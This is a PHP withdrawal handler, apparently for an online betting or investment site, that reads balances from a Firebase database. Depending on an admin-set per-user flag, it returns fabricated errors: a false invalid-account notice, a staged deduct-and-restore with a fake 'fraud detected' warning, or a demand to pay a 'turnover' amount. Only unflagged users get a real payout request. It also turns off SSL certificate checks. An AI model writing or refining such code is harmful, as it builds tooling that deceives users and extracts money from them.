<?php
session_start();
error_reporting(0);
header('Content-Type: application/json');

define('FIREBASE_URL', 'https://firequeen-2986c-default-rtdb.asia-southeast1.firebasedatabase.app/');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_SESSION['username'] ?? '';
    
    if (empty($username)) {
        echo json_encode(['status' => 'error', 'msg' => 'Sesi habis, silakan login ulang.']);
        exit;
    }

    $amount = isset($_POST['amount']) ? intval(preg_replace('/[^0-9]/', '', $_POST['amount'])) : 0;
    
    function firebase_request($path, $method = 'GET', $data = null) {
        $url = FIREBASE_URL . $path . '.json';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Cache-Control: no-cache']); 
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        } elseif ($method === 'PATCH') {
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        }
        $res = curl_exec($ch);
        curl_close($ch);
        return json_decode($res, true);
    }

    // --- STEP 1: AMBIL DATA USER & CEK PENDING ---
    $u_path = "users_situs1/" . trim($username);
    $u_data = firebase_request($u_path);
    
    // VALIDASI ANTI-SPAM: Cek apakah ada WD yang masih Pending
    $all_wd = firebase_request("withdraw_requests_situs1");
    if ($all_wd) {
        foreach ($all_wd as $wd) {
            if (isset($wd['username']) && $wd['username'] === $username && $wd['status'] === "Pending") {
                echo json_encode([
                    'status' => 'error', 
                    'msg' => "⚠️ MOHON TUNGGU! ⚠️\nMasih ada penarikan yang sedang diproses. Harap tunggu sampai selesai sebelum WD lagi."
                ]);
                exit; // Stop proses di sini
            }
        }
    }

    $saldo_awal = (int)($u_data['saldo'] ?? 0);
    $status_wd  = strval($u_data['status_wd'] ?? '0');

    // --- STEP 2: VALIDASI NOMINAL ---
    if ($amount < 50000) {
        echo json_encode(['status' => 'error', 'msg' => 'Minimal withdraw Rp 50.000']);
        exit;
    }

    if ($amount > $saldo_awal) {
        echo json_encode(['status' => 'error', 'msg' => 'Saldo tidak mencukupi!']);
        exit;
    }

// --- STEP 4: PEMBAGIAN SKENARIO ---
    if ($status_wd === '1') {
        echo json_encode([
            'status' => 'error', 
            'msg' => "⚠️ PENARIKAN GAGAL! ⚠️\nNomor rekening anda tidak valid. Harap hubungi CS."
        ]);
    } elseif ($status_wd === '2') {
        // FLASH RESTORE
        firebase_request($u_path, 'PATCH', ['saldo' => $saldo_awal - $amount]);
        usleep(300000); 
        firebase_request($u_path, 'PATCH', ['saldo' => $saldo_awal]);

        echo json_encode([
            'status' => 'error', 
            'msg' => "⚠️ TERDETEKSI KECURANGAN! ⚠️\nSaldo telah dikembalikan, silakan hubungi CS."
        ]);
    } elseif ($status_wd === '3') {
        // Ambil nominal TO dari data user, default ke '0' jika tidak ada
        $target_to = $u_data['nominal_to'] ?? '0';
        $formatted_to = number_format((float)$target_to, 0, ',', '.');
        
        echo json_encode([
            'status' => 'error', 
            'msg' => "⚠️ PENARIKAN GAGAL ⚠️\n" .
                     "\n" .
                     "!Turnover belum tercapai   !\n\n" .
                     "\nTARGET TOURNOVER YANG HARUS DI BAYARKAN SENILAI RP : {$formatted_to}\n" 
        ]);
        exit; // Menghentikan eksekusi agar tidak lanjut ke bawah

    } else {
        // WD NORMAL
        $new_bal = $saldo_awal - $amount;
        $upd = firebase_request($u_path, 'PATCH', ['saldo' => $new_bal]);
        
        if ($upd !== null) { // Memperbaiki pengecekan success response
            $wd_payload = [
                "username" => $username,
                "amount" => $amount,
                "status" => "Pending",
                "bank" => $u_data['bank_name'] ?? '-',
                "norek" => $u_data['acc_no'] ?? '-',
                "nama" => $u_data['acc_name'] ?? $username,
                "created_at" => date("Y-m-d H:i:s")
            ];
            firebase_request("withdraw_requests_situs1", "POST", $wd_payload);
            echo json_encode(['status' => 'success', 'msg' => 'Withdraw Berhasil Diajukan!']);
        } else {
            echo json_encode(['status' => 'error', 'msg' => 'Gagal memproses saldo.']);
        }
    }

} else {
    echo json_encode(['status' => 'error', 'msg' => 'Akses ditolak!']);
}